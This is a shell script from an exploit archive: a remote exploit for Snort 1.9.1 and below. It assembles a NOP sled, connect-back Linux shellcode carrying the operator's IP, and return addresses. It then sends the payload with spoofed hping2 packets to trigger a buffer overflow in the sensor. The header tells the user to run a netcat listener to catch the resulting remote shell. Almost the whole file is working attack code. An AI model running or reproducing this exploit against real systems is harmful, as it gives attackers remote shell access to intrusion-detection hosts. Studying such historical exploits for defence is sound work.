#!/bin/sh

##########################################################
# p7snort191.sh by truff (truff@projet7.org)             #
# Snort 1.9.1 and below remote exploit                   #
#                                                        #
# Tested on Slackware 8.0 with Snort 1.9.1 from sources  #
#                                                        #
# Usage:                                                 #
# 1/ Launch a listening netcat to listen for the shell   #
# nc -p 45295 -l                                         #
#                                                        #
# 2/ p7snort119.sh yourIP [Ret_Addr]                     #
#                                                        #
# Where yourIP is the IP where the netcat is listening   #
# and Ret_Addr is the address (8 hexa digits) of the     #
# shellcode (eg: 0819fec2)                               #
#                                                        #
#                                                        #
# This vulnerability was discovered by Bruce Leidl,      #
# Juan Pablo Martinez Kuhn, and Alejandro David Weil     #
# from Core Security Technologies during Bugweek 2003.   #
#                                                        #
# Greetz to #root people and projet7 members.            #
# Special thx to mycroft for helping me with shell       #
# scripting stuff.                                       #
#                                                        #
# www.projet7.org - Security Researchs -                 #
##########################################################


# Put here the path to your hping2 binary
HPING2=/usr/sbin/hping2

# You should change these params to make the snort sensor 
# capture the packets.
IPSRC=192.168.22.1
IPDST=192.168.22.2
PTSRC=3339
PTDST=111



echo "p7snort191.sh by truff (truff@projet7.org)"

case $# in
0)
echo "Bad number of params"
echo "Read comments in sources"
exit -1
;;
1)
RET=0819fec2
echo "Using default retaddr (Slackware 8.0)"
echo $RET
;;
2)
RET=$2
echo "Using custom retaddr"
echo $RET
;;
*)
echo "Bad number of params"
echo "Read comments in sources"
exit -1
;;
esac



# Nops
i=0
while [ "$i" -lt "512" ]; do
i=$(expr "$i" + 1)
echo -n -e "\x90" >> egg
done


# linux x86 shellcode by eSDee of Netric (www.netric.org)
# 131 byte - connect back shellcode (port=0xb0ef)
echo -n -e "\x31\xc0\x31\xdb\x31\xc9\x51\xb1" >> egg
echo -n -e "\x06\x51\xb1\x01\x51\xb1\x02\x51" >> egg
echo -n -e "\x89\xe1\xb3\x01\xb0\x66\xcd\x80" >> egg
echo -n -e "\x89\xc2\x31\xc0\x31\xc9\x51\x51" >> egg
echo -n -e "\x68" >> egg

# IP here 
echo -n -e $(printf "\\\x%02x" $(echo $1 | cut -d. -f1) \
$(echo $1 | cut -d. -f2) \
$(echo $1 | cut -d. -f3) \
$(echo $1 | cut -d. -f4)) >> egg

echo -n -e "\x66\x68\xb0" >> egg
echo -n -e "\xef\xb1\x02\x66\x51\x89\xe7\xb3" >> egg
echo -n -e "\x10\x53\x57\x52\x89\xe1\xb3\x03" >> egg
echo -n -e "\xb0\x66\xcd\x80\x31\xc9\x39\xc1" >> egg 
echo -n -e "\x74\x06\x31\xc0\xb0\x01\xcd\x80" >> egg
echo -n -e "\x31\xc0\xb0\x3f\x89\xd3\xcd\x80" >> egg
echo -n -e "\x31\xc0\xb0\x3f\x89\xd3\xb1\x01" >> egg
echo -n -e "\xcd\x80\x31\xc0\xb0\x3f\x89\xd3" >> egg
echo -n -e "\xb1\x02\xcd\x80\x31\xc0\x31\xd2" >> egg
echo -n -e "\x50\x68\x6e\x2f\x73\x68\x68\x2f" >> egg
echo -n -e "\x2f\x62\x69\x89\xe3\x50\x53\x89" >> egg
echo -n -e "\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0" >> egg
echo -n -e "\x01\xcd\x80" >> egg

# 3 dummy bytes for alignment purposes
echo -n -e "\x41\x41\x41" >> egg

i=0
cpt=$(expr 3840 - 134 - 512)
cpt=$(expr $cpt / 4)


var1=0x$(echo $RET | cut -b7,8)
var2=0x$(echo $RET | cut -b5,6)
var3=0x$(echo $RET | cut -b3,4)
var4=0x$(echo $RET | cut -b1,2)

while [ "$i" -lt "$cpt" ]; do
i=$(expr "$i" + 1)
echo -n -e $(printf "\\\x%02x" $var1 $var2 $var3 $var4) >> egg
done


# hping ruleZ
$HPING2 $IPDST -a $IPSRC -s $PTSRC -p $PTDST --ack --rst -c 1 \
-d 0x1 --setseq 0xffff0023 --setack 0xc0c4c014 \
1>/dev/null 2>/dev/null

$HPING2 $IPDST -a $IPSRC -s $PTSRC -p $PTDST --ack --rst -c 1 \
-d 0xF00 -E egg --setseq 0xffffffff --setack 0xc0c4c014 \
1>/dev/null 2>/dev/null

$HPING2 $IPSRC -a $IPDST -s $PTDST -p $PTSRC --ack -c 1 \
-d 0 --setseq 0xc0c4c014 --setack 0xffffffff \
1>/dev/null 2>/dev/null

rm egg

echo "Exploit Sended"

# milw0rm.com [2003-04-23]
